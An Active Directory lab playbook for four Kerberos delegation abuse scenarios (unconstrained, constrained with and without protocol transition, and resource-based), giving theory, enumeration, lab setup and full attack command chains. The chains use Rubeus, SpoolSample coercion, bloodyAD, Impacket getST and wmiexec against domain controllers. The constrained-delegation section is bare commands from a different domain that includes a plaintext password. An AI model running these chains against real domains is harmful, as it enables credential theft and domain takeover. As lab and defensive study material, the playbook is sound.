# Kerberos Delegation Abuse Playbook

**Lab domain:** `warzone.oxsium.local`
**Domain controller:** `WIN-WARZONE.warzone.oxsium.local`
**Tooling path:** `C:\Tools` (PowerView.ps1, Rubeus.exe, mimikatz.exe, SharpHound.exe, Snaffler.exe, Whisker.exe)

This playbook documents four Kerberos delegation abuse scenarios built and tested in an isolated Active Directory lab: Unconstrained Delegation, Constrained Delegation with Protocol Transition, Constrained Delegation without Protocol Transition, and Resource-Based Constrained Delegation (RBCD).

---

## 1. Background: Delegation Types in the GUI

```text
Do not trust this computer for delegation                         - No Delegation
Trust this computer for delegation to any service (Kerberos only)  - Unconstrained Delegation
Trust this computer for delegation to specified services only      - Constrained Delegation
    Use Kerberos only                                               - Constrained, no Protocol Transition
    Use any authentication protocol                                 - Constrained, with Protocol Transition
(Resource-Based Constrained Delegation is configured on the *target*
 object's msDS-AllowedToActOnBehalfOfOtherIdentity attribute, not here)
```

| Scenario | Object Type | Name | Required Attribute |
|---|---|---|---|
| 1. Unconstrained | Computer | `UNCON-PC$` | `TrustedForDelegation = True` |
| 2. Constrained (with PT) | User | `unconstrained-svc` | SPN + `msDS-AllowedToDelegateTo` + `TrustedToAuthForDelegation = True` |
| 3. Constrained (no PT) | User | `constrained-svc` | SPN + `msDS-AllowedToDelegateTo`, `TrustedToAuthForDelegation = False` (default) |
| 4. RBCD | Computer | `RBCD-PC$` | No delegation flags on itself; `msDS-AllowedToActOnBehalfOfOtherIdentity` set to attacker-controlled principal |

---

## 2. Unconstrained Delegation

### 2.1 Theory

A computer or service account flagged `TRUSTED_FOR_DELEGATION` (`userAccountControl` bit `0x80000`) caches the **full forwardable TGT** of any user who authenticates to it via Kerberos. If an attacker gains SYSTEM on that host, they can extract any cached TGT from LSASS memory — including a Domain Admin's — without needing that user's credentials at all. The classic trigger is forcing privileged authentication via a coercion bug (e.g. the MS-RPRN "PrinterBug").

### 2.2 Enumeration

```powershell
Import-Module .\PowerView.ps1

# PowerView
Get-DomainComputer -Unconstrained | Select-Object samaccountname, distinguishedname
Get-DomainUser -Unconstrained | Select-Object samaccountname, distinguishedname

# Native AD module
Get-ADComputer -Filter {TrustedForDelegation -eq $true} -Properties TrustedForDelegation, dNSHostName
Get-ADUser -Filter {TrustedForDelegation -eq $true} -Properties TrustedForDelegation
```

These queries check the `TRUSTED_FOR_DELEGATION` bit. Any object returned — computer or user — is a potential unconstrained delegation target, since it will cache TGTs of anyone authenticating to it.

### 2.3 Lab Setup

```powershell
Import-Module ActiveDirectory

# Create computer account under the Delegation OU
New-ADComputer -Name "UNCON-PC" -SAMAccountName "UNCON-PC" -Enabled $true `
    -Path "OU=Delegation,DC=warzone,DC=oxsium,DC=local"

# Enable unconstrained delegation (TRUSTED_FOR_DELEGATION flag)
Set-ADAccountControl -Identity "UNCON-PC$" -TrustedForDelegation $true

# Check
Get-ADComputer -Identity "UNCON-PC" -Properties TrustedForDelegation, userAccountControl
```

### 2.4 Attack Chain

```powershell
Import-Module .\PowerView.ps1

# Monitor for incoming TGTs in the SYSTEM context, on UNCON-PC itself
.\Rubeus.exe monitor /interval:5 /filteruser:Administrator

# Coercion: force the Domain Controller to authenticate to UNCON-PC
.\SpoolSample.exe WIN-WARZONE.warzone.oxsium.local UNCON-PC.warzone.oxsium.local

# Inject the captured base64 ticket from the monitor output
.\Rubeus.exe ptt /ticket:BASE64_TICKET_HERE
```

**Notes:**
- `Rubeus.exe monitor` only has access to cached TGTs if run as SYSTEM on `UNCON-PC` itself (e.g. via `PsExec64.exe -s`).
- `SpoolSample.exe` is not part of the default tool set in `C:\Tools` — it (or an equivalent printer-bug/coercion tool) needs to be added separately.
- Replace `Administrator` in `/filteruser` with the actual privileged account name being targeted in the lab.

---

## 3. Constrained Delegation with Protocol Transition (S4U2Self + S4U2Proxy)

```
python3 /home/sako/Tools/Impacket/examples/getTGT.py redelegate.vl/'FS01$':'sako2005!' -dc-ip 10.129.30.71
export KRB5CCNAME=FS01\$.ccache
klist

python3 /home/sako/Tools/bloodyAD/bloodyAD.py -d redelegate.vl -u helen.frost -p 'sako2005!' --host dc.redelegate.vl add uac 'FS01$' -f TRUSTED_TO_AUTH_FOR_DELEGATION

python3 /home/sako/Tools/bloodyAD/bloodyAD.py -d redelegate.vl -u helen.frost -p 'sako2005!' --host dc.redelegate.vl set object 'FS01$' msDS-AllowedToDelegateTo -v 'cifs/dc.redelegate.vl' -v 'ldap/dc.redelegate.vl'

python3 /home/sako/Tools/bloodyAD/bloodyAD.py -d redelegate.vl -u helen.frost -p 'sako2005!' --host dc.redelegate.vl get object 'FS01$' --attr msDS-AllowedToDelegateTo
python3 /home/sako/Tools/bloodyAD/bloodyAD.py -d redelegate.vl -u helen.frost -p 'sako2005!' --host dc.redelegate.vl get object RYAN.COOPER --attr userAccountControl

python3 /home/sako/Tools/Impacket/examples/getST.py -spn cifs/dc.redelegate.vl -impersonate ryan.cooper redelegate.vl/'FS01$':'sako2005!' -dc-ip 10.129.30.71

export KRB5CCNAME=ryan.cooper.ccache
python3 /home/sako/Tools/Impacket/examples/wmiexec.py -k -no-pass dc.redelegate.vl
```

---

## 4. Constrained Delegation without Protocol Transition (Use Kerberos only)

### 4.1 Theory

Without `TRUSTED_TO_AUTH_FOR_DELEGATION` set, S4U2Self still succeeds for any account, but the resulting ticket is **not forwardable**. S4U2Proxy will reject a non-forwardable ticket, so the attacker cannot fabricate impersonation of an arbitrary user purely from the compromised account's credentials. Real impersonation under this configuration requires the attacker to already hold a genuine forwardable TGT/TGS for the target user (e.g. captured via an unconstrained delegation host or other coercion technique), which is then relayed through S4U2Proxy.

### 4.2 Enumeration

```powershell
Import-Module .\PowerView.ps1

# PowerView - accounts with delegation targets but NOT Protocol Transition
Get-DomainUser -AllowDelegation | Where-Object { $_.useraccountcontrol -notmatch "TRUSTED_TO_AUTH_FOR_DELEGATION" } | `
    Select-Object samaccountname, msds-allowedtodelegateto

# Native AD module
Get-ADUser -Filter {msDS-AllowedToDelegateTo -like "*" -and TrustedToAuthForDelegation -eq $false} `
    -Properties msDS-AllowedToDelegateTo, TrustedToAuthForDelegation, ServicePrincipalName
```

This isolates constrained-delegation accounts that are restricted to "Kerberos only." These are lower risk than their Protocol-Transition counterparts on their own, but become dangerous when chained with another technique that supplies a real forwardable ticket for the target user.

### 4.3 Lab Setup

```powershell
Import-Module ActiveDirectory

# Create service account
New-ADUser -Name "constrained-svc" -SAMAccountName "constrained-svc" `
    -AccountPassword (ConvertTo-SecureString "sako2005!" -AsPlainText -Force) `
    -Enabled $true -PasswordNeverExpires $true

# Set SPN
setspn -A HTTP/constrained-svc.warzone.oxsium.local constrained-svc

# Constrained delegation, WITHOUT Protocol Transition
# (TrustedToAuthForDelegation is not set - default remains False)
Set-ADUser -Identity "constrained-svc" -Add @{
    'msDS-AllowedToDelegateTo' = @("CIFS/WIN-WARZONE.warzone.oxsium.local","HTTP/WIN-WARZONE.warzone.oxsium.local")
}

# Check - TrustedToAuthForDelegation must be False
Get-ADUser -Identity "constrained-svc" -Properties TrustedToAuthForDelegation, msDS-AllowedToDelegateTo, ServicePrincipalName
```

### 4.4 Observing the Restriction

```powershell
# Obtain the NTLM hash
.\Rubeus.exe hash /password:sako2005! /user:constrained-svc /domain:warzone.oxsium.local

# Attempting to impersonate Administrator will fail at S4U2Proxy
# because the S4U2Self ticket is not forwardable
.\Rubeus.exe s4u /user:constrained-svc /rc4:BURAYA_RC4_HASH `
    /impersonateuser:Administrator `
    /msdsspn:CIFS/WIN-WARZONE.warzone.oxsium.local `
    /ptt
```

Compare this directly against Scenario 3 (with PT) using the same `/impersonateuser:Administrator` target: the PT version succeeds and grants access, while this one is rejected at the S4U2Proxy stage — illustrating why "Use Kerberos only" is meaningfully safer.

---

## 5. Resource-Based Constrained Delegation (RBCD)

### 5.1 Theory

RBCD inverts where trust is configured: instead of the delegating account holding a list of allowed targets, the **target object** holds a list of principals allowed to act on its behalf, in `msDS-AllowedToActOnBehalfOfOtherIdentity`. This means an attacker needs no special configuration on a "delegating" account — only:

1. The ability to create a computer object (default `ms-DS-MachineAccountQuota` allows any domain user to create up to 10), and
2. Write-level permission (`GenericWrite`, `GenericAll`, or similar) over some target computer/service object.

With both, the attacker creates their own computer account, writes its SID into the target's `msDS-AllowedToActOnBehalfOfOtherIdentity`, then uses S4U2Self + S4U2Proxy from their own account to impersonate any user against the target.

### 5.2 Enumeration

```powershell
Import-Module .\PowerView.ps1

# PowerView - find objects with RBCD already configured
Get-DomainComputer -Properties name, msds-allowedtoactonbehalfofotheridentity | `
    Where-Object { $_.'msds-allowedtoactonbehalfofotheridentity' }

# Native AD module
Get-ADComputer -Filter * -Properties msDS-AllowedToActOnBehalfOfOtherIdentity | `
    Where-Object { $_.'msDS-AllowedToActOnBehalfOfOtherIdentity' }

# Check the current user's MachineAccountQuota (how many computer objects they can create)
Get-ADObject (Get-ADDomain).DistinguishedName -Properties ms-DS-MachineAccountQuota

# Find objects where a controlled principal has GenericAll/GenericWrite (BloodHound covers this more thoroughly)
Get-DomainObjectAcl -Identity "RBCD-PC" -ResolveGUIDs | `
    Where-Object { $_.ActiveDirectoryRights -match "GenericAll|GenericWrite|WriteProperty" }
```

The first two queries find delegation that's already configured (post-compromise persistence indicator). The quota and ACL checks are pre-attack reconnaissance: they tell you whether you, as a low-privileged user, currently have the prerequisites to set up an RBCD attack against a given target.

### 5.3 Lab Setup — Target Object

```powershell
Import-Module ActiveDirectory

# Target computer account - under the Delegation OU
New-ADComputer -Name "RBCD-PC" -SAMAccountName "RBCD-PC" -Enabled $true `
    -Path "OU=Delegation,DC=warzone,DC=oxsium,DC=local"

# Manually add the CIFS SPN (it doesn't register automatically since this isn't a real domain-joined computer)
setspn -A CIFS/RBCD-PC.warzone.oxsium.local RBCD-PC$

# Check - TrustedForDelegation is False, msDS-AllowedToActOnBehalfOfOtherIdentity is empty, SPN is present
Get-ADComputer -Identity "RBCD-PC" -Properties TrustedForDelegation, msDS-AllowedToActOnBehalfOfOtherIdentity, ServicePrincipalName
setspn -L RBCD-PC$
```

### 5.4 Attack Chain — Attacker-Controlled Object

```powershell
Import-Module .\PowerView.ps1

# 1. Create an attacker-controlled computer account (run as lowpriv-user to simulate the real scenario)
$ComputerName = "EVIL-PC"
$Password = ConvertTo-SecureString "Ev1lP@ss123!" -AsPlainText -Force

New-ADComputer -Name $ComputerName -SAMAccountName "$ComputerName`$" `
    -AccountPassword $Password -Enabled $true `
    -Path "OU=Delegation,DC=warzone,DC=oxsium,DC=local"

# 2. Resolve EVIL-PC$'s SID
$evilSID = Convert-NameToSid EVIL-PC$

# 3. Point RBCD-PC's msDS-AllowedToActOnBehalfOfOtherIdentity at EVIL-PC$
Set-ADComputer -Identity "RBCD-PC" -PrincipalsAllowedToDelegateToAccount "EVIL-PC$"

# 4. Verify
$rbcd = Get-ADComputer -Identity "RBCD-PC" -Properties msDS-AllowedToActOnBehalfOfOtherIdentity
$rbcd.'msDS-AllowedToActOnBehalfOfOtherIdentity'.Access

# 5. Convert EVIL-PC$'s password to an NTLM hash
.\Rubeus.exe hash /password:Ev1lP@ss123! /user:EVIL-PC$ /domain:warzone.oxsium.local

# 6. Full S4U chain: impersonate Administrator against RBCD-PC's CIFS service
.\Rubeus.exe s4u /user:EVIL-PC$ /rc4:BURAYA_RC4_HASH `
    /impersonateuser:Administrator `
    /msdsspn:CIFS/RBCD-PC.warzone.oxsium.local `
    /domain:warzone.oxsium.local `
    /ptt

# 7. Verify access
klist
ls \\RBCD-PC.warzone.oxsium.local\C$
```

**Confirmed lab result:** `S4U2self success!` → `S4U2proxy success!` → `Ticket successfully imported!`, followed by successful access to `\\RBCD-PC.warzone.oxsium.local\C$`.

**Key troubleshooting notes from this lab run:**
- `Rubeus.exe s4u` requires `/rc4` or `/aes256` — never `/password`.
- `KDC_ERR_S_PRINCIPAL_UNKNOWN` during S4U2Proxy almost always means the target SPN was never registered with `setspn -A` on the target computer account — this was the root cause of repeated failures until the SPN was added.
- `/ptt` injects the ticket directly into the current logon session's memory; it does not write a `.kirbi` file to disk. Use `/outfile:name` instead of (or alongside) `/ptt` if a ticket file is needed for separate analysis or import.
- `New-MachineAccount` is not present in all PowerView forks; `New-ADComputer` (AD module) plus `setspn` works as a reliable substitute when the function is missing. `Convert-NameToSid` was available in this lab's PowerView build.
- `Remove-Computer` unjoins a *local* machine from the domain — it does not delete an AD computer object. Use `Remove-ADComputer` to delete an AD object.

---

## 6. Summary Comparison

| Scenario | Trust Location | Impersonate Arbitrary User? | Key Risk Factor |
|---|---|---|---|
| Unconstrained | Delegating account (`TrustedForDelegation`) | Yes, if victim authenticates to host | Coercion + SYSTEM access to host |
| Constrained + PT | Delegating account (`msDS-AllowedToDelegateTo` + `TrustedToAuthForDelegation`) | Yes, via S4U2Self | Compromised credentials (e.g. Kerberoast) |
| Constrained, no PT | Delegating account (`msDS-AllowedToDelegateTo` only) | No, unless attacker already holds victim's forwardable ticket | Lower risk alone; dangerous when chained |
| RBCD | Target object (`msDS-AllowedToActOnBehalfOfOtherIdentity`) | Yes, via attacker's own created computer account | `GenericWrite`/`GenericAll` ACL + MachineAccountQuota |
